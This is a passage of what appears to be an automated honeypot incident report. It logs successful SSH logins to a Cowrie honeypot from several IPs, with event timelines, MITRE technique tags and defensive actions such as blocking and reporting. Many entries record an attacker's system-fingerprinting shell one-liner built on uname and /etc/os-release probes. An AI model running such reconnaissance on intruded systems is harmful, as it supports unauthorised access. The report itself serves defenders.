| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:53:38` | `cowrie.session.connect` |
| `2026-07-08 19:53:38` | `cowrie.client.version` |
| `2026-07-08 19:53:38` | `cowrie.client.kex` |
| `2026-07-08 19:53:39` | `cowrie.login.success` |
| `2026-07-08 19:53:41` | `cowrie.session.params` |
| `2026-07-08 19:53:41` | `cowrie.command.input` |
| `2026-07-08 19:53:41` | `cowrie.command.input` |
| `2026-07-08 19:53:41` | `cowrie.command.input` |
| `2026-07-08 19:53:41` | `cowrie.command.input` |
| `2026-07-08 19:53:41` | `cowrie.command.input` |
| `2026-07-08 19:53:41` | `cowrie.command.success` |
| `2026-07-08 19:53:41` | `cowrie.command.input` |
| `2026-07-08 19:53:41` | `cowrie.command.input` |
| `2026-07-08 19:53:41` | `cowrie.command.input` |
| `2026-07-08 19:53:41` | `cowrie.command.input` |
| `2026-07-08 19:53:41` | `cowrie.log.closed` |
| `2026-07-08 19:53:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-188c2785e6c2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:54 |
| **Last Seen** | 2026-07-08 19:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:54:03` | `cowrie.session.connect` |
| `2026-07-08 19:54:03` | `cowrie.client.version` |
| `2026-07-08 19:54:03` | `cowrie.client.kex` |
| `2026-07-08 19:54:05` | `cowrie.login.success` |
| `2026-07-08 19:54:06` | `cowrie.session.params` |
| `2026-07-08 19:54:06` | `cowrie.command.input` |
| `2026-07-08 19:54:06` | `cowrie.command.input` |
| `2026-07-08 19:54:06` | `cowrie.command.input` |
| `2026-07-08 19:54:06` | `cowrie.command.input` |
| `2026-07-08 19:54:06` | `cowrie.command.input` |
| `2026-07-08 19:54:06` | `cowrie.command.success` |
| `2026-07-08 19:54:06` | `cowrie.command.input` |
| `2026-07-08 19:54:06` | `cowrie.command.input` |
| `2026-07-08 19:54:06` | `cowrie.command.input` |
| `2026-07-08 19:54:06` | `cowrie.command.input` |
| `2026-07-08 19:54:07` | `cowrie.log.closed` |
| `2026-07-08 19:54:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f19ededcf5df

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:55 |
| **Last Seen** | 2026-07-08 19:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:55:58` | `cowrie.session.connect` |
| `2026-07-08 19:55:58` | `cowrie.client.version` |
| `2026-07-08 19:55:58` | `cowrie.client.kex` |
| `2026-07-08 19:56:00` | `cowrie.login.success` |
| `2026-07-08 19:56:02` | `cowrie.session.params` |
| `2026-07-08 19:56:02` | `cowrie.command.input` |
| `2026-07-08 19:56:02` | `cowrie.command.input` |
| `2026-07-08 19:56:02` | `cowrie.command.input` |
| `2026-07-08 19:56:02` | `cowrie.command.input` |
| `2026-07-08 19:56:02` | `cowrie.command.input` |
| `2026-07-08 19:56:02` | `cowrie.command.success` |
| `2026-07-08 19:56:02` | `cowrie.command.input` |
| `2026-07-08 19:56:02` | `cowrie.command.input` |
| `2026-07-08 19:56:02` | `cowrie.command.input` |
| `2026-07-08 19:56:02` | `cowrie.command.input` |
| `2026-07-08 19:56:02` | `cowrie.log.closed` |
| `2026-07-08 19:56:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cafb79d9d9e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:56 |
| **Last Seen** | 2026-07-08 19:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:56:07` | `cowrie.session.connect` |
| `2026-07-08 19:56:07` | `cowrie.client.version` |
| `2026-07-08 19:56:07` | `cowrie.client.kex` |
| `2026-07-08 19:56:08` | `cowrie.login.success` |
| `2026-07-08 19:56:09` | `cowrie.session.params` |
| `2026-07-08 19:56:09` | `cowrie.command.input` |
| `2026-07-08 19:56:09` | `cowrie.command.input` |
| `2026-07-08 19:56:09` | `cowrie.command.input` |
| `2026-07-08 19:56:09` | `cowrie.command.input` |
| `2026-07-08 19:56:09` | `cowrie.command.input` |
| `2026-07-08 19:56:09` | `cowrie.command.success` |
| `2026-07-08 19:56:09` | `cowrie.command.input` |
| `2026-07-08 19:56:09` | `cowrie.command.input` |
| `2026-07-08 19:56:09` | `cowrie.command.input` |
| `2026-07-08 19:56:09` | `cowrie.command.input` |
| `2026-07-08 19:56:10` | `cowrie.log.closed` |
| `2026-07-08 19:56:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df3c602078f9

| Field | Detail |
|---|---|
| **Source IP** | `65.20.146[.]109` |
| **First Seen** | 2026-07-08 19:56 |
| **Last Seen** | 2026-07-08 19:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:56:18` | `cowrie.session.connect` |
| `2026-07-08 19:56:19` | `cowrie.client.version` |
| `2026-07-08 19:56:19` | `cowrie.client.kex` |
| `2026-07-08 19:56:21` | `cowrie.login.success` |
| `2026-07-08 19:56:23` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:56:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.146[.]109` to AbuseIPDB if not already reported
- [ ] Block `65.20.146[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dde496544e51

| Field | Detail |
|---|---|
| **Source IP** | `177.159.150[.]111` |
| **First Seen** | 2026-07-08 19:56 |
| **Last Seen** | 2026-07-08 19:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:56:28` | `cowrie.session.connect` |
| `2026-07-08 19:56:28` | `cowrie.client.version` |
| `2026-07-08 19:56:28` | `cowrie.client.kex` |
| `2026-07-08 19:56:30` | `cowrie.login.success` |
| `2026-07-08 19:56:31` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:56:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.159.150[.]111` to AbuseIPDB if not already reported
- [ ] Block `177.159.150[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e8b2ec8dcd8

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-08 19:57 |
| **Last Seen** | 2026-07-08 19:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:57:02` | `cowrie.session.connect` |
| `2026-07-08 19:57:02` | `cowrie.client.version` |
| `2026-07-08 19:57:02` | `cowrie.client.kex` |
| `2026-07-08 19:57:03` | `cowrie.login.success` |
| `2026-07-08 19:57:03` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:57:03` | `cowrie.direct-tcpip.data` |
| `2026-07-08 19:57:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a15d9a336874

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-08 19:57 |
| **Last Seen** | 2026-07-08 19:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:57:22` | `cowrie.session.connect` |
| `2026-07-08 19:57:22` | `cowrie.client.version` |
| `2026-07-08 19:57:22` | `cowrie.client.kex` |
| `2026-07-08 19:57:23` | `cowrie.login.success` |
| `2026-07-08 19:57:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f145e88cba6d

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-08 19:57 |
| **Last Seen** | 2026-07-08 19:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:57:22` | `cowrie.session.connect` |
| `2026-07-08 19:57:22` | `cowrie.client.version` |
| `2026-07-08 19:57:22` | `cowrie.client.kex` |
| `2026-07-08 19:57:23` | `cowrie.login.success` |
| `2026-07-08 19:57:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-729200aead57

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:58 |
| **Last Seen** | 2026-07-08 19:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:58:10` | `cowrie.session.connect` |
| `2026-07-08 19:58:10` | `cowrie.client.version` |
| `2026-07-08 19:58:10` | `cowrie.client.kex` |
| `2026-07-08 19:58:12` | `cowrie.login.success` |
| `2026-07-08 19:58:13` | `cowrie.session.params` |
| `2026-07-08 19:58:13` | `cowrie.command.input` |
| `2026-07-08 19:58:13` | `cowrie.command.input` |
| `2026-07-08 19:58:13` | `cowrie.command.input` |
| `2026-07-08 19:58:13` | `cowrie.command.input` |
| `2026-07-08 19:58:13` | `cowrie.command.input` |
| `2026-07-08 19:58:13` | `cowrie.command.success` |
| `2026-07-08 19:58:13` | `cowrie.command.input` |
| `2026-07-08 19:58:13` | `cowrie.command.input` |
| `2026-07-08 19:58:13` | `cowrie.command.input` |
| `2026-07-08 19:58:13` | `cowrie.command.input` |
| `2026-07-08 19:58:14` | `cowrie.log.closed` |
| `2026-07-08 19:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-015acb0f4383

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:58 |
| **Last Seen** | 2026-07-08 19:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:58:17` | `cowrie.session.connect` |
| `2026-07-08 19:58:17` | `cowrie.client.version` |
| `2026-07-08 19:58:17` | `cowrie.client.kex` |
| `2026-07-08 19:58:19` | `cowrie.login.success` |
| `2026-07-08 19:58:21` | `cowrie.session.params` |
| `2026-07-08 19:58:21` | `cowrie.command.input` |
| `2026-07-08 19:58:21` | `cowrie.command.input` |
| `2026-07-08 19:58:21` | `cowrie.command.input` |
| `2026-07-08 19:58:21` | `cowrie.command.input` |
| `2026-07-08 19:58:21` | `cowrie.command.input` |
| `2026-07-08 19:58:21` | `cowrie.command.success` |
| `2026-07-08 19:58:21` | `cowrie.command.input` |
| `2026-07-08 19:58:21` | `cowrie.command.input` |
| `2026-07-08 19:58:21` | `cowrie.command.input` |
| `2026-07-08 19:58:21` | `cowrie.command.input` |
| `2026-07-08 19:58:21` | `cowrie.log.closed` |
| `2026-07-08 19:58:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87059b522c84

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:00 |
| **Last Seen** | 2026-07-08 20:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:00:21` | `cowrie.session.connect` |
| `2026-07-08 20:00:21` | `cowrie.client.version` |
| `2026-07-08 20:00:21` | `cowrie.client.kex` |
| `2026-07-08 20:00:23` | `cowrie.login.success` |
| `2026-07-08 20:00:24` | `cowrie.session.params` |
| `2026-07-08 20:00:24` | `cowrie.command.input` |
| `2026-07-08 20:00:24` | `cowrie.command.input` |
| `2026-07-08 20:00:24` | `cowrie.command.input` |
| `2026-07-08 20:00:24` | `cowrie.command.input` |
| `2026-07-08 20:00:24` | `cowrie.command.input` |
| `2026-07-08 20:00:24` | `cowrie.command.success` |
| `2026-07-08 20:00:24` | `cowrie.command.input` |
| `2026-07-08 20:00:24` | `cowrie.command.input` |
| `2026-07-08 20:00:24` | `cowrie.command.input` |
| `2026-07-08 20:00:24` | `cowrie.command.input` |
| `2026-07-08 20:00:24` | `cowrie.log.closed` |
| `2026-07-08 20:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fef3ee45b117

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 20:00 |
| **Last Seen** | 2026-07-08 20:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:00:31` | `cowrie.session.connect` |
| `2026-07-08 20:00:32` | `cowrie.client.version` |
| `2026-07-08 20:00:32` | `cowrie.client.kex` |
| `2026-07-08 20:00:33` | `cowrie.login.success` |
| `2026-07-08 20:00:35` | `cowrie.session.params` |
| `2026-07-08 20:00:35` | `cowrie.command.input` |
| `2026-07-08 20:00:35` | `cowrie.command.input` |
| `2026-07-08 20:00:35` | `cowrie.command.input` |
| `2026-07-08 20:00:35` | `cowrie.command.input` |
| `2026-07-08 20:00:35` | `cowrie.command.input` |
| `2026-07-08 20:00:35` | `cowrie.command.success` |
| `2026-07-08 20:00:35` | `cowrie.command.input` |
| `2026-07-08 20:00:35` | `cowrie.command.input` |
| `2026-07-08 20:00:35` | `cowrie.command.input` |
| `2026-07-08 20:00:35` | `cowrie.command.input` |
| `2026-07-08 20:00:35` | `cowrie.log.closed` |
| `2026-07-08 20:00:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c019e0f96961

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 20:01 |
| **Last Seen** | 2026-07-08 20:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:01:00` | `cowrie.session.connect` |
| `2026-07-08 20:01:01` | `cowrie.client.version` |
| `2026-07-08 20:01:01` | `cowrie.client.kex` |
| `2026-07-08 20:01:06` | `cowrie.login.success` |
| `2026-07-08 20:01:09` | `cowrie.session.params` |
| `2026-07-08 20:01:09` | `cowrie.command.input` |
| `2026-07-08 20:01:10` | `cowrie.log.closed` |
| `2026-07-08 20:01:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-132ca4828182

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:02 |
| **Last Seen** | 2026-07-08 20:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:02:30` | `cowrie.session.connect` |
| `2026-07-08 20:02:31` | `cowrie.client.version` |
| `2026-07-08 20:02:31` | `cowrie.client.kex` |
| `2026-07-08 20:02:32` | `cowrie.login.success` |
| `2026-07-08 20:02:34` | `cowrie.session.params` |
| `2026-07-08 20:02:34` | `cowrie.command.input` |
| `2026-07-08 20:02:34` | `cowrie.command.input` |
| `2026-07-08 20:02:34` | `cowrie.command.input` |
| `2026-07-08 20:02:34` | `cowrie.command.input` |
| `2026-07-08 20:02:34` | `cowrie.command.input` |
| `2026-07-08 20:02:34` | `cowrie.command.success` |
| `2026-07-08 20:02:34` | `cowrie.command.input` |
| `2026-07-08 20:02:34` | `cowrie.command.input` |
| `2026-07-08 20:02:34` | `cowrie.command.input` |
| `2026-07-08 20:02:34` | `cowrie.command.input` |
| `2026-07-08 20:02:35` | `cowrie.log.closed` |
| `2026-07-08 20:02:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfce21e40396

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 20:02 |
| **Last Seen** | 2026-07-08 20:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:02:43` | `cowrie.session.connect` |
| `2026-07-08 20:02:43` | `cowrie.client.version` |
| `2026-07-08 20:02:43` | `cowrie.client.kex` |
